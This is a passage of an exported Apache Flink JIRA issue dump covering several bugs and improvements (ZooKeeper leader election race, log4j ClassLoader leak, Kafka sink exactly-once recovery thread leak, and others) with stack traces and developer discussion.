{noformat}",,,,,,,,,,,,,,,,,,,,,FLINK-31995,,,,,,,FLINK-29813,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jun 13 07:16:09 UTC 2023,,,,,,,,,,"0|z1i5sg:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"26/May/23 09:10;mapohl;Thanks for reporting the issue. I'm going to have a look. -But I suspect it not being related to the FLINK-26522 changes because the test still relies on the legacy {{LeaderElectionDriver}} implementation of ZooKeeper.- This specific test utilizes the {{DefaultLeaderElectionService}} which was touched in FLINK-31838 and FLINK-31773;;;","26/May/23 09:15;mapohl;FYI: CI failed on [a4de8945|https://github.com/apache/flink/commit/a4de8945]. That version didn't include FLINK-31776, yet.;;;","26/May/23 10:49;mapohl;It's most likely being caused by FLINK-31995. The {{ZooKeeperLeaderElectionDriver}} uses a {{DirectExecutorService}} in for the {{TreeCache}}. The {{RejectedExecutionException}} handling was added in FLINK-31995. So, it could be that it reveals a bug in some other code which was just not visible before.;;;","26/May/23 12:38;mapohl;The curator's {{TreeCache}} isn't thread-safe: The event processing within the cache happens is triggered from within the client's EventThread and calls {{TreeCache#publishEvent}}:
{code}
[...]
May 25 18:45:50 	at org.apache.flink.shaded.curator5.org.apache.curator.framework.recipes.cache.TreeCache.publishEvent(TreeCache.java:902)
May 25 18:45:50 	at org.apache.flink.shaded.curator5.org.apache.curator.framework.recipes.cache.TreeCache.publishEvent(TreeCache.java:894)
[...]
May 25 18:45:50 	at org.apache.flink.shaded.zookeeper3.org.apache.zookeeper.ClientCnxn$EventThread.processEvent(ClientCnxn.java:634)
May 25 18:45:50 	at org.apache.flink.shaded.zookeeper3.org.apache.zookeeper.ClientCnxn$EventThread.run(ClientCnxn.java:553)
[...]
{code}
{{TreeCache#publishEvent}} will submit a new task to the cache's {{executorService}} (see [TreeCache:901|https://github.com/apache/curator/blob/844c0ad36340b695b2784489c078cfd78522143c/curator-recipes/src/main/java/org/apache/curator/framework/recipes/cache/TreeCache.java#L901]) which is a {{directExecutorService}} in the case of Flink's ZooKeeper LeaderElectionDriver implementations (see [ZooKeeperUtils:764|https://github.com/apache/flink/blob/4576e4384ff36623712043564039f654c3b44a30/flink-runtime/src/main/java/org/apache/flink/runtime/util/ZooKeeperUtils.java#L764] for the legacy {{ZooKeeperLeaderElectionDriver}} and [ZooKeeperMultipleComponentLeaderElectionDriver:76|https://github.com/apache/flink/blob/8ddfd590ebba7fc727e79db41b82d3d40a02b56a/flink-runtime/src/main/java/org/apache/flink/runtime/leaderelection/ZooKeeperMultipleComponentLeaderElectionDriver.java#L76]). The close call happens in the test's main thread.

The {{TreeCache#close}} call sets the cache's state to {{CLOSED}} in [TreeCache:628|https://github.com/apache/curator/blob/844c0ad36340b695b2784489c078cfd78522143c/curator-recipes/src/main/java/org/apache/curator/framework/recipes/cache/TreeCache.java#L628]. {{TreeCache#publishEvent}} checks this state in [TreeCache:898|https://github.com/apache/curator/blob/844c0ad36340b695b2784489c078cfd78522143c/curator-recipes/src/main/java/org/apache/curator/framework/recipes/cache/TreeCache.java#L898]. The latter one doesn't use a lock. This can cause a race condition where the {{publishEvent}} method is called and passes the if condition before the test's main thread can trigger the close method but after the task is actually submitted causing the {{RejectedExecutionException}} which we're observing right now.

[~dmvk] may you verify my finding? I would suggest adding a less restrictive version of the {{DirectExecutorService}} that we could use in the production code to avoid running into this bug. We could continue to use the more restrictive version (which was introduced in FLINK-31995) in the test code. WDYT David?;;;","26/May/23 12:47;mapohl;FYI: I couldn't reproduce the error locally with 10000 test executions.;;;","30/May/23 08:04;mapohl;Looking into the code once more: FLINK-31995 in general is problematic because we use {{DirectExecutorService.INSTANCE}} in several places as a singleton. We should through a {{RejectedExecutionException}} in these cases because that might influence other classes which use the very same executor.;;;","03/Jun/23 09:49;yunta;Another instance: https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=49593&view=logs&j=0da23115-68bb-5dcd-192c-bd4c8adebde1&t=24c3384f-1bcb-57b3-224f-51bf973bbee8;;;","06/Jun/23 14:49;Sergey Nuyanzin;https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=49606&view=logs&j=f0ac5c25-1168-55a5-07ff-0e88223afed9&t=50bf7a25-bdc4-5e56-5478-c7b4511dde53&l=7108;;;","12/Jun/23 09:51;jark;ZooKeeperLeaderElectionTest.testZooKeeperReelection
https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=49893&view=logs&j=0da23115-68bb-5dcd-192c-bd4c8adebde1&t=24c3384f-1bcb-57b3-224f-51bf973bbee8;;;","13/Jun/23 07:16;mapohl;master: df2b9f8d4722c8fc9533656340b9162e0199fb08;;;",,,,,,,,,,,,,
Potential ClassLoader memory leak due to log4j configuration,FLINK-32203,13537763,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,,,Oleksandr Nitavskyi,Oleksandr Nitavskyi,26/May/23 07:29,26/May/23 14:19,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,,,,,0,pull-request-available,,,"*Context*

We have encountered a memory leak related to ClassLoaders in Apache Flink. ChildFirstClassLoader is not properly garbage collected, when job is being restarted.
Heap Dump has shown that Log4j starts a configuration watch thread, which then has Strong reference to ChildFirstClassLoader via AccessControlContext. Since thread is never stopped, ChildFirstClassLoader is never cleaned. 

Removal monitorInterval introduced in FLINK-20510 helps to mitigate the issue, I believe it could be applied to log4j config by default.

*How to reproduce*
Deploy Flink job, which uses Hadoop File System (e.g. s3a). Redeploy the job -> in Task Manager dump you should see multiple Log4jThreads

*AC*
We have a configuration which doesn't lead easy to memory leak with default configuration for Flink users.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"26/May/23 07:31;Oleksandr Nitavskyi;classloader_leak.png;https://issues.apache.org/jira/secure/attachment/13058565/classloader_leak.png","26/May/23 07:32;Oleksandr Nitavskyi;stack_trace_example_with_log4j_creation_on_job_reload.log;https://issues.apache.org/jira/secure/attachment/13058566/stack_trace_example_with_log4j_creation_on_job_reload.log",,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri May 26 13:26:02 UTC 2023,,,,,,,,,,"0|z1i5rs:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"26/May/23 13:26;Oleksandr Nitavskyi;[~chesnay] thanks for looking into PR (https://github.com/apache/flink/pull/22664). You can see in attach an example of the stack trace, which we get when Log4jThread is being created.

We have run the job and were killing one of JobManager to rely on HA and trigger the job restart.
During debug of the Log4jThread creation we saw that in StackTrace there are Presto (for checkpoint) or Hadoop S3A (to write output on S3) FileSystems, which are loaded from Plugin Classloader. (example stack trace is attached)

Do you know if a plugin Classloader instance is created per job, when a job is being created? If yes, probably this instance is being passed to Log4jContextFactory and thus a new Log4j subsystem being created.;;;",,,,,,,,,,,,,,,,,,,,,,
useless configuration,FLINK-32202,13537755,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,Invalid,,zhangdong7,zhangdong7,26/May/23 06:51,26/May/23 09:54,04/Jun/24 20:41,26/May/23 09:50,1.15.4,,,,,,,,,,,,,,,,,,,,Runtime / Queryable State,,,,0,,,,"According to the official Flink documentation, the parameter query.server.ports has been replaced by queryable-state.server.ports, but the parameter query.server.ports:6125 will be generated when Flink starts. Is this a historical problem?

 
{code:java}
public static final ConfigOption<String> SERVER_PORT_RANGE = ConfigOptions.key(""queryable-state.server.ports"").stringType().defaultValue(""9067"").withDescription(""The port range of the queryable state server. The specified range can be a single port: \""9123\"", a range of ports: \""50100-50200\"", or a list of ranges and ports: \""50100-50200,50300-50400,51234\""."").withDeprecatedKeys(new String[]{""query.server.ports""});{code}
 ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri May 26 09:50:18 UTC 2023,,,,,,,,,,"0|z1i5q0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"26/May/23 09:50;martijnvisser;Queryable State is (soft) deprecated, so this should doesn't have to be fixed at this moment;;;",,,,,,,,,,,,,,,,,,,,,,
Enable the distribution of shuffle descriptors via the blob server by connection number,FLINK-32201,13537753,13535621,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Done,huwh,huwh,huwh,26/May/23 06:33,01/Jul/23 10:20,04/Jun/24 20:41,01/Jul/23 10:20,,,,,,,,,,,,,,,1.18.0,,,,,,Runtime / Coordination,,,,0,pull-request-available,,,"
Flink support distributes shuffle descriptors via the blob server to reduce JobManager overhead. But the default threshold to enable it is 1MB, which never reaches. Users need to set a proper value for this, but it requires advanced knowledge before configuring it.

I would like to enable this feature by the number of connections of a group of shuffle descriptors. For examples, a simple streaming job with two operators, each with 10,000 parallelism and connected via all-to-all distribution. In this job, we only get one set of shuffle descriptors, and this group has 10000 * 10000 connections. This means that JobManager needs to send this set of shuffle descriptors to 10000 tasks.

Since it is also difficult for users to configure, I would like to give it a default value. The serialized shuffle descriptors sizes for different parallelism are shown below.


|| Producer parallelism || serialized shuffle descriptor size || consumer parallelism || total data size that JM needs to send ||
| 5000 | 100KB | 5000 | 500MB |
| 10000 | 200KB | 10000 | 2GB |
| 20000 | 400Kb | 20000 | 8GB |

So, I would like to set the default value to 10,000 * 10,000. 

Any suggestions or concerns are appreciated.

",,,,,,,,,,FLINK-32225,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Sat Jul 01 10:20:09 UTC 2023,,,,,,,,,,"0|z1i5pk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"01/Jul/23 10:20;wanglijie;Done via:
master(1.18): 4fe3560015cd9cc076afad470228a9565d557935
 ;;;",,,,,,,,,,,,,,,,,,,,,,
OrcFileSystemITCase cashed with exit code 239 (NoClassDefFoundError: scala/concurrent/duration/Deadline),FLINK-32200,13537751,13537639,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Critical,Duplicate,,mapohl,mapohl,26/May/23 06:29,13/Jun/23 21:32,04/Jun/24 20:41,13/Jun/23 21:32,1.18.0,,,,,,,,,,,,,,,,,,,,Runtime / Coordination,,,,0,test-stability,,,"https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=49325&view=logs&j=4eda0b4a-bd0d-521a-0916-8285b9be9bb5&t=2ff6d5fa-53a6-53ac-bff7-fa524ea361a9&l=12302

{code}
12:24:14,883 [flink-akka.actor.internal-dispatcher-2] ERROR org.apache.flink.util.FatalExitExceptionHandler              [] - FATAL: Thread 'flink-akka.actor.internal-dispatcher-2' produced an uncaught exception. Stopping the process...
java.lang.NoClassDefFoundError: scala/concurrent/duration/Deadline
        at scala.concurrent.duration.Deadline$.apply(Deadline.scala:30) ~[flink-rpc-akka_318674dc-e98c-4e16-8705-faefda52bd1a.jar:1.18-SNAPSHOT]
        at scala.concurrent.duration.Deadline$.now(Deadline.scala:76) ~[flink-rpc-akka_318674dc-e98c-4e16-8705-faefda52bd1a.jar:1.18-SNAPSHOT]
        at akka.actor.CoordinatedShutdown.loop$1(CoordinatedShutdown.scala:737) ~[flink-rpc-akka_318674dc-e98c-4e16-8705-faefda52bd1a.jar:1.18-SNAPSHOT]
        at akka.actor.CoordinatedShutdown.$anonfun$run$7(CoordinatedShutdown.scala:762) ~[flink-rpc-akka_318674dc-e98c-4e16-8705-faefda52bd1a.jar:1.18-SNAPSHOT]
        at scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:307) ~[flink-rpc-akka_318674dc-e98c-4e16-8705-faefda52bd1a.jar:1.18-SNAPSHOT]
        at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:41) ~[flink-rpc-akka_318674dc-e98c-4e16-8705-faefda52bd1a.jar:1.18-SNAPSHOT]
        at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:64) ~[flink-rpc-akka_318674dc-e98c-4e16-8705-faefda52bd1a.jar:1.18-SNAPSHOT]
        at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:63) ~[flink-rpc-akka_318674dc-e98c-4e16-8705-faefda52bd1a.jar:1.18-SNAPSHOT]
        at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:100) ~[flink-rpc-akka_318674dc-e98c-4e16-8705-faefda52bd1a.jar:1.18-SNAPSHOT]
        at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23) ~[flink-rpc-akka_318674dc-e98c-4e16-8705-faefda52bd1a.jar:1.18-SNAPSHOT]
        at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:85) ~[flink-rpc-akka_318674dc-e98c-4e16-8705-faefda52bd1a.jar:1.18-SNAPSHOT]
        at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:100) ~[flink-rpc-akka_318674dc-e98c-4e16-8705-faefda52bd1a.jar:1.18-SNAPSHOT]
        at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:49) ~[flink-rpc-akka_318674dc-e98c-4e16-8705-faefda52bd1a.jar:1.18-SNAPSHOT]
        at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:48) [flink-rpc-akka_318674dc-e98c-4e16-8705-faefda52bd1a.jar:1.18-SNAPSHOT]
        at java.util.concurrent.ForkJoinTask.doExec(ForkJoinTask.java:289) [?:1.8.0_292]
        at java.util.concurrent.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1056) [?:1.8.0_292]
        at java.util.concurrent.ForkJoinPool.runWorker(ForkJoinPool.java:1692) [?:1.8.0_292]
        at java.util.concurrent.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:175) [?:1.8.0_292]
12:24:14,882 [flink-metrics-akka.actor.internal-dispatcher-2] ERROR org.apache.flink.util.FatalExitExceptionHandler              [] - FATAL: Thread 'flink-metrics-akka.actor.internal-dispatcher-2' produced an uncaught exception. Stopping the process...
java.lang.NoClassDefFoundError: scala/concurrent/duration/Deadline
        at scala.concurrent.duration.Deadline$.apply(Deadline.scala:30) ~[flink-rpc-akka_318674dc-e98c-4e16-8705-faefda52bd1a.jar:1.18-SNAPSHOT]
        at scala.concurrent.duration.Deadline$.now(Deadline.scala:76) ~[flink-rpc-akka_318674dc-e98c-4e16-8705-faefda52bd1a.jar:1.18-SNAPSHOT]
        at akka.actor.CoordinatedShutdown.loop$1(CoordinatedShutdown.scala:737) ~[flink-rpc-akka_318674dc-e98c-4e16-8705-faefda52bd1a.jar:1.18-SNAPSHOT]
        at akka.actor.CoordinatedShutdown.$anonfun$run$7(CoordinatedShutdown.scala:762) ~[flink-rpc-akka_318674dc-e98c-4e16-8705-faefda52bd1a.jar:1.18-SNAPSHOT]
        at scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:307) ~[flink-rpc-akka_318674dc-e98c-4e16-8705-faefda52bd1a.jar:1.18-SNAPSHOT]
        at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:41) ~[flink-rpc-akka_318674dc-e98c-4e16-8705-faefda52bd1a.jar:1.18-SNAPSHOT]
        at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:64) ~[flink-rpc-akka_318674dc-e98c-4e16-8705-faefda52bd1a.jar:1.18-SNAPSHOT]
        at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:63) ~[flink-rpc-akka_318674dc-e98c-4e16-8705-faefda52bd1a.jar:1.18-SNAPSHOT]
        at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:100) ~[flink-rpc-akka_318674dc-e98c-4e16-8705-faefda52bd1a.jar:1.18-SNAPSHOT]
        at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23) ~[flink-rpc-akka_318674dc-e98c-4e16-8705-faefda52bd1a.jar:1.18-SNAPSHOT]
        at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:85) ~[flink-rpc-akka_318674dc-e98c-4e16-8705-faefda52bd1a.jar:1.18-SNAPSHOT]
        at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:100) ~[flink-rpc-akka_318674dc-e98c-4e16-8705-faefda52bd1a.jar:1.18-SNAPSHOT]
        at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:49) ~[flink-rpc-akka_318674dc-e98c-4e16-8705-faefda52bd1a.jar:1.18-SNAPSHOT]
        at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:48) [flink-rpc-akka_318674dc-e98c-4e16-8705-faefda52bd1a.jar:1.18-SNAPSHOT]
        at java.util.concurrent.ForkJoinTask.doExec(ForkJoinTask.java:289) [?:1.8.0_292]
        at java.util.concurrent.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1056) [?:1.8.0_292]
        at java.util.concurrent.ForkJoinPool.runWorker(ForkJoinPool.java:1692) [?:1.8.0_292]
        at java.util.concurrent.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:175) [?:1.8.0_292]
Caused by: java.lang.ClassNotFoundException: scala.concurrent.duration.Deadline
        at java.net.URLClassLoader.findClass(URLClassLoader.java:382) ~[?:1.8.0_292]
        at java.lang.ClassLoader.loadClass(ClassLoader.java:418) ~[?:1.8.0_292]
        at org.apache.flink.core.classloading.ComponentClassLoader.loadClassFromComponentOnly(ComponentClassLoader.java:150) ~[flink-core-1.18-SNAPSHOT.jar:1.18-SNAPSHOT]
        at org.apache.flink.core.classloading.ComponentClassLoader.loadClass(ComponentClassLoader.java:113) ~[flink-core-1.18-SNAPSHOT.jar:1.18-SNAPSHOT]
        at java.lang.ClassLoader.loadClass(ClassLoader.java:351) ~[?:1.8.0_292]
{code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue May 30 09:36:14 UTC 2023,,,,,,,,,,"0|z1i5p4:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"26/May/23 08:11;Sergey Nuyanzin;looks like not only OrcFileSystemITCase fails with this
HiveDialectITCase also crashed like that
https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=49393&view=logs&j=fc5181b0-e452-5c8f-68de-1097947f6483&t=995c650b-6573-581c-9ce6-7ad4cc038461&l=23089;;;","30/May/23 09:36;chesnay;I haven't looked at the logs but this can be a red herring.

What could happen is that something crashes the JVM, then the shutdown hook closes the RPC system classloader, which then causes the Akka RPC system to break down throwing more fatal errors.;;;",,,,,,,,,,,,,,,,,,,,,
MetricStore does not remove metrics of nonexistent parallelism in TaskMetricStore when scale down job parallelism,FLINK-32199,13537747,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,JunRuiLi,JunRuiLi,JunRuiLi,26/May/23 05:03,05/Jun/23 07:54,04/Jun/24 20:41,05/Jun/23 07:54,1.17.0,,,,,,,,,,,,,,1.16.3,1.17.2,1.18.0,,,,Runtime / Metrics,Runtime / REST,,,0,pull-request-available,,,"After FLINK-29615, FLINK will update the subtask metrics store when scaling down parallelism. However, task metrics are added in the form of ""subtaskIndex + metric.name"" or ""subtaskIndex + operatorName + metric.name"". Users will be able to find many redundant metrics through JobVertexMetricsHandler, which will be very troublesome for users.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Jun 05 07:54:03 UTC 2023,,,,,,,,,,"0|z1i5o8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"26/May/23 05:06;JunRuiLi;I've prepared a quick fix for it. Can you assign this ticket for me?[~wanglijie] :);;;","26/May/23 05:43;wanglijie;Thanks [~JunRuiLi] , assigned to you :D;;;","05/Jun/23 07:54;wanglijie;Fix via:
master(1.18): f3ab9626bf18cad993f7cecba23a7bce6e14407b
release-1.17: 07959a4141ba599194e1e0a8b6da163793d53d0d
release-1.16: e90b2e01fd42330e1115a96e2045d0b3189ba321;;;",,,,,,,,,,,,,,,,,,,,
Enforce single maxExceptions query parameter,FLINK-32198,13537746,13540585,Sub-task,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,pgaref,pgaref,pgaref,26/May/23 04:07,25/Mar/24 23:12,04/Jun/24 20:41,,,,,,,,,,,,,,,,2.0.0,,,,,,Runtime / REST,,,,0,2.0-related,pull-request-available,,"While working on FLINK-31894 I realized that `UpperLimitExceptionParameter` allows multiple values to be collected as a comma separated list even though JobExceptionsHandler is only using the first one [https://github.com/apache/flink/blob/1293958652053c0d163fde28e8dfefb5ee8f6101/flink-runtime/src/main/java/org/apache/flink/runtime/rest/handler/job/JobExceptionsHandler.java#L101-L104]

A better approach would be to deny multiple `maxExceptions` params and let the users know.

 ",,,,,,,,,,,,,,,,,,,,,,,,,,,,FLINK-31894,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed May 31 01:16:05 UTC 2023,,,,,,,,,,"0|z1i5o0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"31/May/23 01:16;pgaref;This is a breaking change so will have to wait for Flink 2.0;;;",,,,,,,,,,,,,,,,,,,,,,
FLIP 246: Dynamic Kafka Source,FLINK-32197,13537730,,New Feature,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,mason6345,mason6345,mason6345,25/May/23 23:17,25/Jan/24 21:56,04/Jun/24 20:41,25/Jan/24 21:56,kafka-3.1.0,,,,,,,,,,,,,,kafka-3.1.0,,,,,,Connectors / Kafka,,,,0,,,,"This is for introducing a new connector that extends off the current KafkaSource to read multiple Kafka clusters, which can change dynamically.

For more details, please refer to [FLIP 246|https://cwiki.apache.org/confluence/display/FLINK/FLIP-246%3A+Multi+Cluster+Kafka+Source].",,,,,,,,,,,,,,,,,,,,,,,,,,,,,FLINK-14729,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Jan 08 16:38:51 UTC 2024,,,,,,,,,,"0|z1i5kg:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"19/Sep/23 06:09;yunta;[~mason6345] I noticed that this this ticket has been created several months ago, what's the progress currently?;;;","19/Sep/23 23:44;mason6345;Hi [~yunta], there is a PR out for FLINK-32416. I actually can't assign those subtasks to myself since I don't have permissions. Otherwise, I would mark them as ""in progress"". 

Currently I am waiting for a review and talked to [~tzulitai] offline since he was interested in this FLIP. He would have more time to look at it after this month and, if not, I can start to ask some internal folks to review it as well, though it would be great to get others to review. ;;;","20/Sep/23 08:58;yunta;[~mason6345] Thanks for the information! I will also ask some guys to take a look of the PR when possible.;;;","08/Jan/24 16:38;mason6345;Hi [~yunta], the PR for https://issues.apache.org/jira/browse/FLINK-32416 is still waiting for more feedback. Are you or your collaborators able to give the PR a review? I'll also ask on the mailing list.;;;",,,,,,,,,,,,,,,,,,,
kafka sink under EO sometimes is unable to recover from a checkpoint,FLINK-32196,13537710,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,sharonxr55,sharonxr55,25/May/23 18:33,26/May/23 04:50,04/Jun/24 20:41,,1.15.4,1.6.4,,,,,,,,,,,,,,,,,,,Connectors / Kafka,,,,0,,,,"We are seeing an issue where a Flink job using kafka sink under EO is unable to recover from a checkpoint. The sink task stuck at `INITIALIZING` state and eventually runs OOM. The cause for OOM is that there is a kafka producer thread leak.

Here is our best *hypothesis* for the issue.
In `KafkaWriter` under the EO semantic, it intends to abort lingering transactions upon recovery 
[https://github.com/apache/flink/blob/release-1.15/flink-connectors/flink-connector-kafka/src/main/java/org/apache/flink/connector/kafka/sink/KafkaWriter.java#L175-L179]

However, the actual implementation to abort those transactions in the `TransactionAborter` doesn't abort those transactions 
[https://github.com/apache/flink/blob/release-1.15/flink-connectors/flink-connector-kafka/src/main/java/org/apache/flink/connector/kafka/sink/TransactionAborter.java#L97-L124]

Specifically `producer.abortTransaction()` is never called in that function. Instead it calls `producer.flush()`.

Also The function is in for loop that only breaks when `producer.getEpoch() == 0` which is why we are seeing a producer thread leak as the recovery gets stuck in this for loop.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"25/May/23 21:48;sharonxr55;healthy_kafka_producer_thread.csv;https://issues.apache.org/jira/secure/attachment/13058559/healthy_kafka_producer_thread.csv","25/May/23 21:44;sharonxr55;kafka_producer_network_thread_log.csv;https://issues.apache.org/jira/secure/attachment/13058558/kafka_producer_network_thread_log.csv","25/May/23 22:03;sharonxr55;kafka_sink_oom_logs.csv;https://issues.apache.org/jira/secure/attachment/13058560/kafka_sink_oom_logs.csv",,,,,,,,,,,,,,,,3.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri May 26 04:50:46 UTC 2023,,,,,,,,,,"0|z1i5g0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"25/May/23 20:50;tzulitai;Hi [~sharonxr55], the {{abortTransactionOfSubtask}} you posted aborts transactions by relying on the fact that when you call `initTransactions()`, Kafka automatically aborts any old ongoing transactions under the same {{{}transactional.id{}}}.

Could you re-elaborate the producer leak? As far as I can tell, the loop is reusing the same producer instance; on every loop entry, the same producer instance is reset with a new {{transactional.id}} and called {{initTransactions()}} to abort the transaction. So, there doesn't seem to be an issue with run-away producer instances, unless I'm misunderstanding something here.;;;","25/May/23 21:01;tzulitai;In terms of the lingering transactions you are observing, a few questions:
 # Are you actually observing that there are lingering transactions not being aborted in Kafka? Or was that a speculation based on not seeing a {{abortTransaction()}} in the code?
 # If there are actually lingering transactions in Kafka after restore, do they get timeout by Kafka after {{{}transaction.timeout.ms{}}}? Or are they lingering beyond the timeout threshold?;;;","25/May/23 21:52;sharonxr55;Thank you [~tzulitai] for the quick response and information.
{quote}Are you actually observing that there are lingering transactions not being aborted in Kafka? Or was that a speculation based on not seeing a abortTransaction() in the code?
{quote}
This is a speculation. So this may not be the root cause of the issue I'm seeing.
{quote}If there are actually lingering transactions in Kafka after restore, do they get timeout by Kafka after transaction.timeout.ms? Or are they lingering beyond the timeout threshold?
{quote}
What I've observed is that the subtask gets stuck in the initializing state and there is a growing number of kafka-producer-network-thread and the job eventually runs OOM -  In the [^kafka_sink_oom_logs.csv], you can see lots of producers get closed in the end . In the debug log, I've found that the transaction thread never progress beyond “Transition from state INITIALIZING to READY” and eventually times out. An example thread log is [^kafka_producer_network_thread_log.csv] . A healthy transaction goes from INITIALIZING to READY- to COMMITTING_TRANSACTION to READY in the log and the thread doesn't exit - example [^healthy_kafka_producer_thread.csv].

I've also queried the kafka's _transaction_state topic for the problematic transaction and [here|https://gist.github.com/sharonx/51e300e383455f016be1a95f0c855b97] are the messages in the topic.  

I'd appreciate any pointers or potential ways to explain the situation. 
;;;","26/May/23 00:04;tzulitai;[~sharonxr55] a few things to clarify first:
 # When a KafkaSink subtask restores, there are some transaction that needs to be committed (i.e. ones that are written in the Flink checkpoint), and
 # All other transactions are considered ""lingering"" which should be aborted (which is done by the loop you referenced).
 # Only after the above 2 step completes, the subtask initialization is considered complete.

So:

> A healthy transaction goes from INITIALIZING to READY- to COMMITTING_TRANSACTION to READY in the log

I believe these transactions are the ones from step 1. Which is expected.

> I've found that the transaction thread never progress beyond “Transition from state INITIALIZING to READY”

These are the ones to abort in step 2. Initializing the transaction automatically aborts the transaction, as I mentioned in earlier comments. So I believe this is also expected.

 

What is NOT expected, though, is the bunch of {{kafka-producer-network-thread}} threads being spawned per TID to abort in step 2. Thanks for sharing the logs btw, it was helpful figuring out what was going on!

Kafka's producer only spawns a single {{kafka-producer-network-thread}} per instance. And the abort loop for lingering transactions always tries to reuse the same producer instance without creating new ones, so I would expect to only see a single {{kafka-producer-network-thread}} throughout the whole loop. This doesn't seem to be the case. From the naming of these threads, it seems like for every TID that the KafkaSink is trying to abort, a new {{kafka-producer-network-thread}} thread is spawned:

This is hinted by the naming of the threads (see the last portion of the thread name, where it's strictly incrementing; that's the TIDs of transactions the KafkaSink is trying to abort)
{code:java}
